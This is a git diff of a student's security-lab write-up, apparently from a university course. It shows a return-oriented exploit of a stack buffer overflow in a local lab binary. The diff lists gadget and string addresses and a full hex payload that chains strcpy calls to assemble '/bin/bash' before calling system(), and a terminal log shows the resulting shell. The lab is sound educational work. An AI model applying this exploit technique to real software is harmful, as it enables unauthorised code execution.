@@ -110,7 +110,7 @@ Key to Flags:
 ### Step7 - Find out where hexacode of strings are.(We're using them to build our own command)
 + We're going to build '/bin/bash' string.
 + In our program, there are a lot of same string already.
-+ Find out the addresses of the hexacodes and use them to build our command string
++ Find out the addresses of the hexacodes below.
 ```
 [03/02/22]seed@VM:Byeongchan$ readelf -x 10 ans_check7_static > a
 [03/02/22]seed@VM:Byeongchan$ vi a
@@ -134,7 +134,17 @@ Hex dump of section '.rodata':
   0x080bbfa0 62696e61 72790000 67656e65 7269635f binary..generic_
   0x080bbfb0 73746172 745f6d61 696e002f 6465762f start_main./dev/
   0x080bbfc0 66756c6c 002f6465 762f6e75 6c6c0000 full./dev/null..
-
+```
++ These are what I found
+```
+/	2f	src_byte_addr_1 0x080bbef1, \xf1\xbe\x0b\x08
+b	62	src_byte_addr_2 0x080bbef2, \xf2\xbe\x0b\x08
+i	69	src_byte_addr_3	0x080bbff0, \xf0\xbf\x0b\x08
+n	6e	src_byte_addr_4	0x080bbff1, \xf1\xbf\x0b\x08
+a	61	src_byte_addr_7	0x080bbf60, \x60\xbf\x0b\x08
+s	73	src_byte_addr_8	0x080bbfd0, \xd0\xbf\x0b\x08
+h	68	src_byte_addr_9	0x080bbf53, \x53\xbf\x0b\x08
+<null terminator>	0   0x080bbea1, \xa1\xbe\x0b\x08
 ```
 
 ### Step8 - Build the command text we're using
@@ -148,36 +158,63 @@ Hex dump of section '.rodata':
 str_loc_1 : The target address where ‘open the shell code command’ resides.
 str_byte_addr_1 : The ascii code we want to copy.
 ```
-+ It's time for building our command string
-```
-&strcpy | &pop-pop-ret | str_loc_1 | src_byte_addr_1
-&strcpy | &pop-pop-ret | str_loc_2 | src_byte_addr_2
-&strcpy | &pop-pop-ret | str_loc_3 | src_byte_addr_3
-&strcpy | &pop-pop-ret | str_loc_4 | src_byte_addr_4
-&strcpy | &pop-pop-ret | str_loc_5 | src_byte_addr_5
-&strcpy | &pop-pop-ret | str_loc_6 | src_byte_addr_6
-&strcpy | &pop-pop-ret | str_loc_7 | src_byte_addr_7
-&strcpy | &pop-pop-ret | str_loc_8 | src_byte_addr_8
-&strcpy | &pop-pop-ret | str_loc_9 | src_byte_addr_9
-&strcpy | &pop-pop-ret | str_loc_10 | src_byte_addr_10
-```
 
 ### Step9 - Make the payload and execute
 + The payload I made is shown below
-+ &system:  0xb7da4da0 <__libc_system>
-+ &exit_path: b7d989d0 <__GI_exit>
-+ &cmd_string: 0xbffff0d3, cmd_string address
 ```
-$(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\xf0\xff\xbf'")
-./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\xf0\xff\xbf'")
+PADDING : build-string-payload | &system() | &exit_path | &cmd_string
+
+&strcpy()
+0x0805b8f0, \xf0\xb8\x05\x08
+
+&pop-pop-ret()
+0x80bbc95, \x95\xbc\x0b\x08
+
+&system(): 
+0x0804eef0, \xf0\xee\x04\x08
+
+&exit()
+0x0806cf93, \x93\xcf\x06\x08
+
+&bss location 
+0x080ebf91, \x91\xbf\x0e\x08
+
+
+/	2f	src_byte_addr_1 0x080bbef1, \xf1\xbe\x0b\x08
+b	62	src_byte_addr_2 0x080bbef2, \xf2\xbe\x0b\x08
+i	69	src_byte_addr_3	0x080bbff0, \xf0\xbf\x0b\x08
+n	6e	src_byte_addr_4	0x080bbff1, \xf1\xbf\x0b\x08
+a	61	src_byte_addr_7	0x080bbf60, \x60\xbf\x0b\x08
+s	73	src_byte_addr_8	0x080bbfd0, \xd0\xbf\x0b\x08
+h	68	src_byte_addr_9	0x080bbf53, \x53\xbf\x0b\x08
+<null terminator>	0   0x080bbea1, \xa1\xbe\x0b\x08
+
+/ \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x91\xbf\x0e\x08\xf1\xbe\x0b\x08
+b \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x92\xbf\x0e\x08\xf2\xbe\x0b\x08
+i \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x93\xbf\x0e\x08\xf0\xbf\x0b\x08
+n \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x94\xbf\x0e\x08\xf1\xbf\x0b\x08
+/ \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x95\xbf\x0e\x08\xf1\xbe\x0b\x08
+b \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x96\xbf\x0e\x08\xf2\xbe\x0b\x08
+a \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x97\xbf\x0e\x08\x60\xbf\x0b\x08
+s \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x98\xbf\x0e\x08\xd0\xbf\x0b\x08
+h \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x99\xbf\x0e\x08\x53\xbf\x0b\x08
+0 \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x9a\xbf\x0e\x08\xa1\xbe\x0b\x08
+system,     \xf0\xee\x04\x08
+exit,       \x93\xcf\x06\x08
+cmd_string, \x91\xbf\x0e\x08
 ```
-+ However, there is one problem executing the payload with the program
-+ The payload I made above failed with ‘/bash’ not found error. And I knew the meaning of it, because find_var program returned the address of ‘SHELL’ text a little bit different. So, I needed to make adjustment a bit. 
-+ First, I tried 3 less bytes and I also failed with ‘bin/bash’ not found. 
-+ Second, I tried 4 less bytes and I got a new shell.
-+ Below is my successful execution command.
+
 ```
-[02/23/22]seed@VM:Byeongchan$ ./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xcf\xf0\xff\xbf'")
+[03/02/22]seed@VM:Byeongchan$ echo $$
+2658
+[03/02/22]seed@VM:Byeongchan$ ./ans_check7_static $(python -c "print '\x90'*54 + '\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x91\xbf\x0e\x08\xf1\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x92\xbf\x0e\x08\xf2\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x93\xbf\x0e\x08\xf0\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x94\xbf\x0e\x08\xf1\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x95\xbf\x0e\x08\xf1\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x96\xbf\x0e\x08\xf2\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x97\xbf\x0e\x08\x60\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x98\xbf\x0e\x08\xd0\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x99\xbf\x0e\x08\x53\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x9a\xbf\x0e\x08\xa1\xbe\x0b\x08\xf0\xee\x04\x08\x93\xcf\x06\x08\x91\xbf\x0e\x08'")
+[03/02/22]seed@VM:Byeongchan$ echo $$
+5049
+[03/02/22]seed@VM:Byeongchan$ exit
+exit
+[03/02/22]seed@VM:Byeongchan$ echo $$
+2658
+[03/02/22]seed@VM:Byeongchan$
 ```
 ![lab5_1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/lab5_1.png)
 
